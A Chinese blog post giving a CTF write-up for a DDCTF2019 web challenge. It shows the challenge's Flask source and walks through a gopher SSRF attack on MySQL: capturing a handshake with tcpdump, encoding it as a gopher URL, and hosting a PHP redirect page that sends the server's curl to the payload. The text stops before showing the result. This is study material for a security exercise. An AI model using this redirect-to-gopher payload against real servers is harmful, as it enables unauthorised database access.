<!DOCTYPE html>
<html>
  
<head>
  <meta charset="utf-8">
  <meta name="author" content="Imtinmin" />
  
  
  <title>DDCTF2019两道WEB题的预期做法 | Imtinmin的小站</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta name="keywords" content="CTF,WEB,CTF," />
  

  
  <meta name="description" content="Imtinmin的小站">

  

  
    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.1/dist/av-min.js" async></script>
  

  
    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
  

  
    <script src="//unpkg.com/valine/dist/Valine.min.js" async></script>
  

  

  <script>
  // theme-ad's config script
  // it can be used in every script
  
  window.AD_CONFIG = {
    leancloud: {"appid":"Hyq9wkH495DgNHWhDQCOfQSp-gzGzoHsz","appkey":"WaR7nrzhliHj9aVwdQzkdlGd","comment":true,"count":true},
    welcome: {"enable":false,"interval":30},
    start_time: "2019-10-31",
    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
    is_post: true,
    lock: false,
    author: "Imtinmin",
    share: {"twitter":false,"facebook":false,"weibo":false,"qq":false,"wechat":false},
    mathjax: true,
    page_type: "",
    root: "/"
  };
</script>

  <script src="/vendor/sha256.min.js"></script>
<script src="/js/auth.js"></script>
<script src="/js/index.js"></script>
<script src="/vendor/qrcode.min.js"></script>

  
    <link rel="icon" href="/images/favicon.ico">
    <link rel="apple-touch-icon" href="/images/touch-icon.png">
  

  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">

  <link rel="stylesheet" href="/css/index.css">
<link rel="stylesheet" href="/styles/components/highlight/highlight.css">

  
</head>
  <body>
    <header class="site-header">
  <div class="site-header-brand">
    
      <span class="site-header-brand-title">
        <a href="/">Imtinmin</a>
      </span>
    
    
      <span class="site-header-brand-motto"> | 无知萌新</span>
    
  </div>
  <div class="site-header-right">
    <nav class="site-header-navigation">
      
        <a href="/" target="_self">首页</a>
      
        <a href="/archives/" target="_self">归档</a>
      
        <a href="/tags/" target="_self">标签</a>
      
        <a href="/categories/" target="_self">分类</a>
      
        <a href="/friends/" target="_self"></a>
      
        <a href="/about/" target="_self"></a>
      
    </nav>
    <div class="site-header-btn">
      
        <a href="https://github.com/Imtinmin/" target="_blank" id="site-github">
          <i class="fa fa-github-alt"></i>
        </a>
      
      <a href="javascript:void(0);" id="site-search">
        <i class="fa fa-search"></i>
      </a>
      <a href="javascript:void(0);" id="site-nav-btn">
        <i class="fa fa-ellipsis-v"></i>
      </a>
    </div>
  </div>
</header>
<nav class="table-content" id="site-nav">
  <div class="table-content-title">
    <span>导航</span>
  </div>
  <div class="table-content-main">
    <ol class="toc">
      
        <li class="toc-item">
          <a href="/" target="_self">
            首页
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/archives/" target="_self">
            归档
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/tags/" target="_self">
            标签
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/categories/" target="_self">
            分类
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/friends/" target="_self">
            
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/about/" target="_self">
            
          </a>
        </li>
      
    </ol>
  </div>
</nav>
<div id="site-process"></div>
    <main>
      
  <div class="passage">
  <div class="passage-meta">
    <span>
      <i class="fa fa-calendar"></i>2019-05-04
    </span>
    
      <span>
        | <a href="/categories/CTF/"><i class="fa fa-bookmark"></i>CTF</a>
      </span>
    
    
      <span>
        | <i class="fa fa-unlock-alt"></i>UNLOCK
      </span>
    
  </div>
  <h1 class="passage-title">
    DDCTF2019两道WEB题的预期做法
  </h1>
  
    <div class="passage-cover">
      <figure style="background-image:url(https://tinmin.cn/wp-content/uploads/2019/04/捕获.png);"></figure>
    </div>
  
  <article class="passage-article">
    <p>起因：<br><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/DDCTF2019/15.png" alt="img"></p>
<p>然后骚扰出题人</p>
<p><code>MYSQL弱口令</code></p>
<blockquote>
<p>解法:gopher攻击mysql</p>
</blockquote>
<p>原题大多数做法是读取<code>.mysql_history</code>获取flag，当这个文件被删除的，就可能需要另外一种做法–gopher攻击mysql，感觉才是预期解法</p>
<h1 id="读取源码"><a href="#读取源码" class="headerlink" title="读取源码"></a>读取源码</h1><p>我们利用之前的脚本读取<code>views.py</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> jsonify, request</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> inet_aton</span><br><span class="line"><span class="keyword">import</span> MySQLdb</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag in mysql  curl@localhost database:security  table:flag</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">weak_scan</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    agent_port = <span class="number">8123</span></span><br><span class="line">    result = []</span><br><span class="line">    target_ip = request.args.get(<span class="string">'target_ip'</span>)</span><br><span class="line">    target_port = request.args.get(<span class="string">'target_port'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> target_ip <span class="keyword">or</span> <span class="keyword">not</span> target_port:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"参数不能为空"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> target_port.isdigit():</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"端口必须为数字"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> checkip(target_ip):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"必须输入ip"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">    <span class="keyword">if</span> is_inner_ipaddress(target_ip):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"ip不能是内网ip"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">    tmp_agent_result = get_agent_result(target_ip, agent_port)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> tmp_agent_result[<span class="number">0</span>] == <span class="number">1</span>:</span><br><span class="line">    tem_result = tmp_agent_result[<span class="number">1</span>]</span><br><span class="line">        result.append(base64.b64encode(tem_result))</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"服务器未开启mysql"</span>, <span class="string">"data"</span>: result&#125;)</span><br><span class="line"></span><br><span class="line">    tmp_result =mysql_scan(target_ip, target_port)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> tmp_result[<span class="string">'Flag'</span>] == <span class="number">1</span>:</span><br><span class="line">        tem_result = tmp_agent_result[<span class="number">1</span>]</span><br><span class="line">        result.append(base64.b64encode(tem_result))</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">"code"</span>: <span class="number">0</span>, <span class="string">"msg"</span>: <span class="string">"未扫描出弱口令"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tem_result = tmp_agent_result[<span class="number">1</span>]</span><br><span class="line">        result.append(base64.b64encode(tem_result))</span><br><span class="line">        result.append(tmp_result)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">"code"</span>: <span class="number">0</span>, <span class="string">"msg"</span>: <span class="string">"服务器存在弱口令"</span>, <span class="string">"data"</span>: result&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkip</span><span class="params">(ip)</span>:</span></span><br><span class="line">    p = re.compile(<span class="string">'^((25[0-5]|2[0-4]\d|[01]?\d\d?)\.)&#123;3&#125;(25[0-5]|2[0-4]\d|[01]?\d\d?)$'</span>)</span><br><span class="line">    <span class="keyword">if</span> p.match(ip):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">curl</span><span class="params">(url)</span>:</span></span><br><span class="line">    tmp = Popen([<span class="string">'curl'</span>, url, <span class="string">'-L'</span>, <span class="string">'-o'</span>, <span class="string">'content.log'</span>], stdout=PIPE)</span><br><span class="line">    tmp.wait()</span><br><span class="line">    result = tmp.stdout.readlines()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_agent_result</span><span class="params">(ip, port)</span>:</span></span><br><span class="line"></span><br><span class="line">    str_port = str(port)</span><br><span class="line">    url = <span class="string">'http://'</span>+ip + <span class="string">':'</span> + str_port</span><br><span class="line">    curl(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'content.log'</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>, <span class="string">'未开启agent'</span>)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'content.log'</span>) <span class="keyword">as</span> f1:</span><br><span class="line">        tmp_list = f1.readlines()</span><br><span class="line">        response = <span class="string">''</span>.join(tmp_list)</span><br><span class="line">    os.remove(<span class="string">'content.log'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="string">'mysqld'</span> <span class="keyword">in</span> response:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>, response)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>, response)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ip2long</span><span class="params">(ip_addr)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> unpack(<span class="string">"!L"</span>, inet_aton(ip_addr))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_inner_ipaddress</span><span class="params">(ip)</span>:</span></span><br><span class="line"></span><br><span class="line">    ip = ip2long(ip)</span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">'127.0.0.0'</span>) &gt;&gt; <span class="number">24</span> == ip &gt;&gt; <span class="number">24</span> <span class="keyword">or</span> \</span><br><span class="line">            ip2long(<span class="string">'10.0.0.0'</span>) &gt;&gt; <span class="number">24</span> == ip &gt;&gt; <span class="number">24</span> <span class="keyword">or</span> \</span><br><span class="line">            ip2long(<span class="string">'172.16.0.0'</span>) &gt;&gt; <span class="number">20</span> == ip &gt;&gt; <span class="number">20</span> <span class="keyword">or</span> \</span><br><span class="line">            ip2long(<span class="string">'192.168.0.0'</span>) &gt;&gt; <span class="number">16</span> == ip &gt;&gt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mysql_scan</span><span class="params">(ip, port)</span>:</span></span><br><span class="line"></span><br><span class="line">    port = int(port)</span><br><span class="line">    weak_user = [<span class="string">'root'</span>, <span class="string">'admin'</span>, <span class="string">'mysql'</span>]</span><br><span class="line">    weak_pass = [<span class="string">''</span>, <span class="string">'mysql'</span>, <span class="string">'root'</span>, <span class="string">'admin'</span>, <span class="string">'test'</span>]</span><br><span class="line">    Flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> weak_user:</span><br><span class="line">        <span class="keyword">for</span> pass_wd <span class="keyword">in</span> weak_pass:</span><br><span class="line">            <span class="keyword">if</span> mysql_login(ip,port, user, pass_wd):</span><br><span class="line">                Flag = <span class="number">1</span></span><br><span class="line">                tmp_dic = &#123;<span class="string">'weak_user'</span>: user, <span class="string">'weak_passwd'</span>: pass_wd, <span class="string">'Flag'</span>: Flag&#125;</span><br><span class="line">                <span class="keyword">return</span> tmp_dic</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tmp_dic = &#123;<span class="string">'weak_user'</span>: <span class="string">''</span>, <span class="string">'weak_passwd'</span>: <span class="string">''</span>, <span class="string">'Flag'</span>: Flag&#125;</span><br><span class="line">                <span class="keyword">return</span> tmp_dic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mysql_login</span><span class="params">(host, port, username, password)</span>:</span></span><br><span class="line">    <span class="string">'''mysql login check'''</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        conn = MySQLdb.connect(</span><br><span class="line">            host=host,</span><br><span class="line">            user=username,</span><br><span class="line">            passwd=password,</span><br><span class="line">            port=port,</span><br><span class="line">            connect_timeout=<span class="number">1</span>,</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"[H:%s P:%s U:%s P:%s]Mysql login Success"</span> % (host,port,username,password),<span class="string">"Info"</span>)</span><br><span class="line">        conn.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> MySQLdb.Error, e:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"[H:%s P:%s U:%s P:%s]Mysql Error %d:"</span> % (host,port,username,password,e.args[<span class="number">0</span>]),<span class="string">"Error"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>注意这一段</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">curl</span><span class="params">(url)</span>:</span></span><br><span class="line">    tmp = Popen([<span class="string">'curl'</span>, url, <span class="string">'-L'</span>, <span class="string">'-o'</span>, <span class="string">'content.log'</span>], stdout=PIPE)</span><br><span class="line">    tmp.wait()</span><br><span class="line">    result = tmp.stdout.readlines()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_agent_result</span><span class="params">(ip, port)</span>:</span></span><br><span class="line"></span><br><span class="line">    str_port = str(port)</span><br><span class="line">    url = <span class="string">'http://'</span>+ip + <span class="string">':'</span> + str_port</span><br><span class="line">    curl(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'content.log'</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>, <span class="string">'未开启agent'</span>)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'content.log'</span>) <span class="keyword">as</span> f1:</span><br><span class="line">        tmp_list = f1.readlines()</span><br><span class="line">        response = <span class="string">''</span>.join(tmp_list)</span><br><span class="line">    os.remove(<span class="string">'content.log'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="string">'mysqld'</span> <span class="keyword">in</span> response:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>, response)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>, response)</span><br></pre></td></tr></table></figure>

<p>扫描时是python mysqldb的client通过mysql协议与服务器进行连接 并试探弱口令,<code>agent.py</code>是运行在服务器8123端口,会先<code>curl+url -L -o content.log</code>,返回值不用管，<code>curl</code>是支持<code>gopher</code>协议的，可以想到用<code>gopher</code>攻击mysql</p>
<p>有很多gopher攻击mysql的文章，讲的很清楚，我就不班门弄斧了<br><a href="https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/</a><br><a href="https://www.baidu.com/link?url=AsD8iSbPxkkFW-esAcd4IwL10bUORvLUO_FA9PLK0Nt4KcMGBmc9OeIAZLkC4fRygM3PSbcM8cKAHg3u1V957q&wd=&eqid=a9cf5feb0002c91b000000065ccd8979" target="_blank" rel="noopener">https://www.baidu.com/link?url=AsD8iSbPxkkFW-esAcd4IwL10bUORvLUO_FA9PLK0Nt4KcMGBmc9OeIAZLkC4fRygM3PSbcM8cKAHg3u1V957q&amp;wd=&amp;eqid=a9cf5feb0002c91b000000065ccd8979</a></p>
<p>点击扫描会发现这道题还开放了api接口，内容是<code>curl</code>的结果的<code>base64</code>编码<br><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/gopher-mysql/1.png" alt="img"></p>
<h1 id="构造数据包"><a href="#构造数据包" class="headerlink" title="构造数据包"></a>构造数据包</h1><p>打开vps</p>
<p>根据题目的提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># flag in mysql  curl@localhost database:security  table:flag</span><br></pre></td></tr></table></figure>

<p>创建用户、数据库、表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE USER &apos;curl&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;&apos;;</span><br><span class="line">CREATE DATABASE security;</span><br><span class="line">GRANT all privileges ON security.* TO &apos;curl&apos;@&apos;localhost&apos;;</span><br><span class="line">use security;</span><br><span class="line">create table flag (id int,string VARCHAR(255));</span><br></pre></td></tr></table></figure>

<p><code>tcpdump</code>抓取mysql数据包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i l0 port 3306 -w mysql.pcap</span><br><span class="line">mysql -ucurl -p</span><br><span class="line">use security;</span><br><span class="line">select * from flag;</span><br><span class="line">exit;</span><br></pre></td></tr></table></figure>

<h1 id="构造出gopher"><a href="#构造出gopher" class="headerlink" title="构造出gopher"></a>构造出gopher</h1><p>然后wireshark设置，TCP追踪一下MYSQL协议的流，过滤出发给3306的数据，转换为原始数据<br><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/gopher-mysql/2.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a300000185a6ff01000000012100000000000000000000000000000000000000000000006375726c00006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f7069640532303834310f5f636c69656e745f76657273696f6e06352e372e3235095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c</span><br><span class="line">210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d69742031</span><br><span class="line">120000000353454c4543542044415441424153452829</span><br><span class="line">09000000027365637572697479</span><br><span class="line">0f0000000373686f7720646174616261736573</span><br><span class="line">0c0000000373686f77207461626c6573</span><br><span class="line">0600000004666c616700</span><br><span class="line">130000000373656c656374202a2066726f6d20666c6167</span><br><span class="line">0100000001</span><br></pre></td></tr></table></figure>

<p>用脚本转换一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">results</span><span class="params">(s)</span>:</span></span><br><span class="line">    a=[s[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,len(s),<span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"curl gopher://127.0.0.1:3306/_%"</span>+<span class="string">"%"</span>.join(a)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line">    s=sys.argv[<span class="number">1</span>]</span><br><span class="line">    print(results(s))</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/gopher-mysql/3.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%63%75%72%6c%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%30%38%34%31%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%35%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%12%00%00%00%03%53%45%4c%45%43%54%20%44%41%54%41%42%41%53%45%28%29%09%00%00%00%02%73%65%63%75%72%69%74%79%0f%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%0c%00%00%00%03%73%68%6f%77%20%74%61%62%6c%65%73%06%00%00%00%04%66%6c%61%67%00%13%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%66%6c%61%67%01%00%00%00%01</span><br></pre></td></tr></table></figure>

<h1 id="构造重定向页面"><a href="#构造重定向页面" class="headerlink" title="构造重定向页面"></a>构造重定向页面</h1><p>在服务上8123端口启动一个web服务，<br>nginx配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 8123 default_server;</span><br><span class="line">    root /var/www/html/tinmin;</span><br><span class="line">    index 1.php;</span><br><span class="line">    location /tinmin/ &#123;</span><br><span class="line">        # First attempt to serve request as file, then</span><br><span class="line">        # as directory, then fall back to displaying a 404.</span><br><span class="line">        try_files $uri $uri/ =404;</span><br><span class="line">    &#125;</span><br><span class="line">    location ~ \.php$ &#123;</span><br><span class="line">        include snippets/fastcgi-php.conf;</span><br><span class="line">    #</span><br><span class="line">    #   # With php-fpm (or other unix sockets):</span><br><span class="line">        fastcgi_pass unix:/var/run/php/php7.2-fpm.sock;</span><br><span class="line">    #   # With php-cgi (or other tcp sockets):</span><br><span class="line">    #   fastcgi_pass 127.0.0.1:9000;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>1.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    header(<span class="string">'Location:gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%63%75%72%6c%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%30%38%34%31%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%35%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%12%00%00%00%03%53%45%4c%45%43%54%20%44%41%54%41%42%41%53%45%28%29%09%00%00%00%02%73%65%63%75%72%69%74%79%0f%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%0c%00%00%00%03%73%68%6f%77%20%74%61%62%6c%65%73%06%00%00%00%04%66%6c%61%67%00%13%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%66%6c%61%67%01%00%00%00%01'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.51.147.155:5000/ctf/api/weak_scan?target_ip=xxx.xxx.xxx.xxx&amp;target_port=3306</span><br></pre></td></tr></table></figure>

<p>得到</p>
